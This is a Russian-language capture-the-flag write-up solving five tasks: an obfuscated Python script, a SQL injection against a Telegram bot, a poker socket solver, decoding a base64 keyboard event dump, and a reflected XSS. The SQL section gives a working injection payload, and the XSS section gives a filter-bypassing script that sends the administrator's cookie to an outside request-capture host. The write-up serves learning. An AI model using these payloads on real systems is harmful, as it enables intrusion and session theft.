## 1. April joke (osint)
### Условие:
```
Мой знакомый прислал мне этот код и сказал что это первоапрельская шутка.
Но что-то мне совсем не до смеха...
```
http://web.ctf.msk.ru/ctn2020finalcvxbud/AprilJoke/joke.py
### Как решать?
Скачиваем код и понимаем, что здесь что-то страшное и обфусцированное. <br>

![](https://storage.geekclass.ru/images/b074300e-f288-42f5-a0f2-3b297bf74f07.png)
Замечаем `from goto import goto, label`, но вот только в питоне нет goto... Или все таки есть? <br>
Внимательно смотрим на категорию задания (osint) и становится понятно, что надо найти библиотеку goto для python, причем еще и для второго!

>Если вы при этом не обратили внимания на категорию и стали руками разбирать код, то примите мои соболезнования)))

Гуглим python2 goto и смотрим все ответы на первой попавшейся ссылке на стаковерфлоу:

![](https://storage.geekclass.ru/images/4bca6611-f220-465f-b276-3cd6555e6254.png)

Бинго! Переходим на `http://entrian.com/goto/`, следуя инструкциям по установке скачиваем goto, запускаем наш код и получаем флаг.

![](https://storage.geekclass.ru/images/0c91f90a-b907-41ca-963a-d8913bdadda1.png)
*Никогда, никогда не используйте goto*


## 2. Greetings bot (web)
### Условие:

```
Одна фирма попросила провести аудит безопасности данного телеграм бота - https://t.me/g3eet1ngs_bot
Сможешь?
```
исходники:
http://web.ctf.msk.ru/ctn2020finalcvxbud/GreetingsBot/presented_bot.py
### Как решать?
Скачиваем исходники и параллельно смотрим, что может бот:

![](https://storage.geekclass.ru/images/e164fb29-a9b6-4b50-a17d-3b2e055a97a0.jpg)

Впрочем ничего интересного, бот просто выводит наше имя на экран с приветствием на выбранном языке. Теперь внимательно изучим исходники:
```
def init_db():
    # ...
    # some boring sql stuff here

    # add super users
    c.execute("INSERT INTO users VALUES (0, '{}')".format(FLAG))
    c.execute("INSERT INTO users VALUES (1, '{}')".format("Mister quote"))
    conn.commit()
```
Замечаем что у нас таблица users в которой по 0 айди лежит флаг. Его-то нам и нужно как-то вытащить.
```
query = "INSERT INTO users VALUES ('{}', '{}')".format(chat_id, name)
    try:
        c.executescript(query)
    except sqlite3.Error as sql_e:
        ...
```
При просмотра на `/start`, обращаем внимание, что:
* данные в наш запрос подставляются форматированием, что позволяет нам произвести `sql инъекцию`
* используется метод `executescript`, который позволяет нам выполнить несколько запросов к базе за одно обращение
```
try:
        username = c.execute("SELECT name FROM users WHERE id={}".format(str(call.from_user.id))).fetchone()
    except sqlite3.Error:
        username = ("Anon",)

    bot.send_message(call.from_user.id, callback_options[callback] + username[0] if username else "Anon")
```
Теперь смотрим код отправки приветствия по нажатию на кнопку и складываем все части мозайки.

Нужно, применив sql инъекцию, вторым запросом после INSERT сделать UPDATE имени того-же значения, которые было вставлено. Для этого составим следующий пейлоад(вместо проверки id можно также проверять name на старое имя):
```
'); UPDATE users SET name=(select name from users where id=0) WHERE id=your_id --
```
Поскольку бот берет значения из имени и фамилии в телеграме, то разбиваем наш пейлоад на 2 части (пейлоад слишком большой, не влезет в одно поле) и ставим в соответствующие поля в настройках своего профиля. Нажимаем /start и получаем флаг.

`P.S` рубрика `#за_сценой`:

Пришлось немного попотеть, чтобы сделать базу устойчивой к случайным дропам таблиц и удалениям флага, вот что было сделано для этого:
```
    c.execute('''CREATE TRIGGER IF NOT EXISTS ensureFlagSafeOnUpdate
            AFTER UPDATE ON users
            BEGIN
                UPDATE users SET name='{}' WHERE id='0';
            END;'''.format(FLAG))

    c.execute('''CREATE TRIGGER IF NOT EXISTS ensureFlagSafeOnDelete
            AFTER DELETE ON users
            BEGIN
                UPDATE users SET name='{}' WHERE id='0';
            END;'''.format(FLAG))

    c.execute('''CREATE TRIGGER IF NOT EXISTS ensureFlagSafeOnInsert
            AFTER INSERT ON users
            BEGIN
                UPDATE users SET name='{}' WHERE id='0';
            END;'''.format(FLAG))

    c.execute('''CREATE TRIGGER IF NOT EXISTS ensureFlagNotDuplicated
            AFTER UPDATE ON users
            WHEN (SELECT COUNT(*) from users) = (SELECT COUNT(*) from users WHERE name='{}')
            BEGIN
                UPDATE users SET name='Whoops, some error. Please type /start again';
            END;'''.format(FLAG))
```
И еще при обработке ошибок:
```
if "no such table" in str(sql_e):
            init_db()
            bot.send_message(chat_id, "Please type /start again")
            return
```
И еще при обработке запросов:
```
def secure_query(q):
    return q.lower().replace("alter", "")
```
Да, вот так вот... Короче говоря, не используйте форматирование))

## 3. Pocker time (ppc)
### Условие:
```
Тут один знакомый попросил ему помочь, я уверен - ты справишься

nc 5.101.113.149 1279
```

### Как решать?
Подключаемся к серверу и получаем следующее задание:

![](https://storage.geekclass.ru/images/1fdc1240-2a4f-479b-b987-43d671d1117c.png)
Нужно несколько раз определить сильнейшую покерную руку, причем успеть это все за минуту. Руками это сделать, очевидно, не получится - значит придется писать код...

![](https://storage.geekclass.ru/images/74263763-2df8-4d62-a6ba-6f2c57686edd.jpg)
*Добро пожаловать в казино...*

Тут можно поступить по разному - либо найти готовый код, либо написать свой. Я пошел по пути наименьшего сопротивления и нашел данную библиотеку для питона: `https://github.com/ihendley/treys`

В итоге у меня получилось как-то так:
```import socket
from treys import Card
from treys import Evaluator

HOST = '5.101.113.149'
PORT = 1279

suits = {"♥": "h", "♣": "c", "♦": "d", "♠": "s"}
evaluator = Evaluator()
board = []
game_phase = False

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))

    while True:

        data = s.recv(1024)
        print(data.decode().split("\n"))
        if not game_phase:
            hands = data.decode().split("\n")[3:9]
        else:
            hands = data.decode().split("\n")[1:7]

        scores = {}

        for idx, hand in enumerate(hands):
            parsed_hand = []

            hand = hand.split(":")[1].strip()
            for card in hand.split():
                p_card = card[0] + suits[card[1]]
                parsed_hand.append(Card.new(p_card))

            score = evaluator.evaluate(board, parsed_hand)
            scores[score] = idx + 1

        answer = str(scores[min(scores)])

        s.send((answer+"\n").encode())
        game_phase = True
```
Запускаем код и получаем флаг.


## 4. Suspicious dump (forensics)
### Условие:
```
cat /dev/input/event1 > /system/kdump
base64 /system/kdump > /system/kdump.txt
```
http://web.ctf.msk.ru/ctn2020finalcvxbud/SuspiciousDump/kdump.txt
### Как решать?

Я человек простой. Вижу base64 - декодирую base64. Что? Нет флага?

![](https://storage.geekclass.ru/images/0a93e023-1993-41bc-82dd-10b551644b66.gif)

Придется все-таки подумать)

Анализируя данный отрывок кода, понимаем что /dev/input/event1 был перенаправлен в файл, а затем закодирован с помощью base64.
Усиленно гуглим и осознаем, что /dev/input/event1 это дамп событий устройства, в нашем случае вероятнее всего клавиатуры.

Гуглим дальше и находим как все это дело раскодировать - `https://stackoverflow.com/questions/5060710/format-of-dev-input-event` 

Продолжаем листать стак и находим маппинг событий в символы - `https://github.com/torvalds/linux/blob/master/include/uapi/linux/input.h`

Теперь мы готовы написать код, который будет все это дело декодировать в понятные нам буковки и цифры. Но все не так просто, написав наш код заметим, что получили что-то похожее на флаг, но не очень. Дело в том, что надо еще учитывать действие спец-клавиш, например бэкспейс удаляет последний символ, а комбинации шифта и некоторых других символов создают новый. Изменим наш код, чтобы учитывать это и получим:
```
import struct
import base64
import io

FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)

# маппинг, который мы получили из linux/input.h
KEYS = {
    0: "",
    1: "esc",
    ...
    12: "-",
    13: "=",
    14: "backspace",
    15: "   ",
    ...
}


def replace_all(text, mapping):
    for i, j in mapping.items():
        text = text.replace(i, j)
    return text


# python3.6+ dict should be ordered
keys_mapping = {
    "left_sh=": "+",
    "left_sh'": "\"",
    "left_sh;": ":",
    "left_sh9": "(",
    "left_sh0": ")",
    "left_sh[": "{",
    "left_sh]": "}",
    "left_sh-": "_",
    "left_sh": ""
}

answer = []

# open file in binary mode
with open("suspicious_dump/kdump.txt", "r",
          encoding="utf-8") as dump:
    bin_ev = io.BytesIO(base64.b64decode(dump.read().encode()))
    event = bin_ev.read(EVENT_SIZE)

    while event:
        (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)

        # print(tv_sec, tv_usec, type, code, value)

        if value == 1:
            print("key " + KEYS[code] + " pressed")
            # если попался backspace удаляем последний символ
            if KEYS[code] == "backspace":
                answer.pop()
            else:
                answer.append(KEYS[code])

        event = bin_ev.read(EVENT_SIZE)

    # прозводим замену спец символов Shift
    print(replace_all("".join(answer), keys_mapping))

```
В результате запуска на дампе получим наш флаг.

## 5. Text shortener (web)
### Условие:
```
Мы разработали новый сверхиновационный сокращатель текста! Вот только он пока еще в тестовом режиме...
Если обнаружите баг - обязательно сообщите администратору!
```
http://5.101.113.149:3572
### Как решать?

Переходим на сайт и видим поле ввода, пробуем ввести что-то, тыкаем ссылочки и понимаем что текст просто кодируется с помощью RLE:

![](https://storage.geekclass.ru/images/8e8ebe8c-c509-4f85-8f78-b71592af9583.png)

Больше вроде ничего интересного, хотя замечаем, что можем отправить ссылку на страницу администратору. Это наводит нас о мысли об XSS, а точнее о его самом распространненом варианте - [reflected XSS](https://owasp.org/www-community/attacks/xss/).

Внимательно посмотрев как отображается введеный текст, понимаем, что специальные символы - <'>" не экранируются. В итоге находим способ встроить произвольный html код:

`"><script>alert('wow, xss')</script>`

И ожидаемо получаем alert:

![](https://storage.geekclass.ru/images/caee4fbc-9fe8-4aa4-8c1d-d76cf41fa499.png)

Попробуем получить отстук к себе, это можно сделать либо имея свой сервер, либо воспользовавшись сервисом по примеру `https://requestbin.com`. В результате безуспешных попыток, понимаем, что сайт фильтрует символ точки и слово `document`. Чтобы обойти данные ограничения используем `eval`, например один из способов:

`"><script>eval(String['fromCharCode'](102,101,116,...))</script>`, где закодированный в аски коды `(102,101,116,...)` пейлоад что-то вроде 
`fetch('http://https://our.domain.pipedream.net/?c=' + document['cookie']` (пытаемся заодно украсть cookie администратора)

Сначала пробуем данный пейлоад у себя и проверяем, что он действительно работает. Убедившись, посылаем ссылку с данным пейлоадом администратору(робот на сервере послушно перейдет по ссылке) и находим флаг в его куках:

![](https://storage.geekclass.ru/images/c16a2d4a-9c5e-4bb0-9a4e-fc5e11cb93a1.png)

P.S в ближайшем времени я планирую опубликовать код данного задания у [себя на гитхабе](https://github.com/leshark), кому интересно - подписывайтесь)